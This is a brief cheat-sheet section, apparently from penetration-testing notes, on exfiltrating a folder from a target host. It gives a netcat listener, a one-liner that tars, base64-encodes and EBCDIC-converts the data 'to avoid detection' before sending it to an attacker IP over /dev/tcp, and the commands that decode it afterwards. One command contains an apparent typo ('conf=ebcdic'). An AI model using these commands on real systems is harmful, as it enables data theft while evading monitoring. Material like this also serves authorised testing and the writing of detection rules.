# Data Exfiltration
### Exfiltrate over TCP Socket with EBCDIC and Base64
##### Establish listener on attack machine and output to file.
```bash
nc -lnvp 80 > datafolder.tmp
```
##### From target, tar folder container efil data with Base64 & EBCDIC (to avoid detection) and redirect STDOUT to TCP socket.
```bash
tar zcf - /tmp/datafolder | base64 | dd conf=ebcdic > /dev/tcp/<Attack IP Address>/80
```
##### From attack machine, decode and extract archive.
```bash
dd conv=ascii if=/tmp/datafolder.tmp | base64 -d > datafolder.tar
tar xf datafolder.tar
```
### Data Exfiltration References
[Base64](https://en.wikipedia.org/wiki/Base64)

[EBCDIC](https://en.wikipedia.org/wiki/EBCDIC)

[I/O Redirection](http://www.tldp.org/LDP/abs/html/io-redirection.html)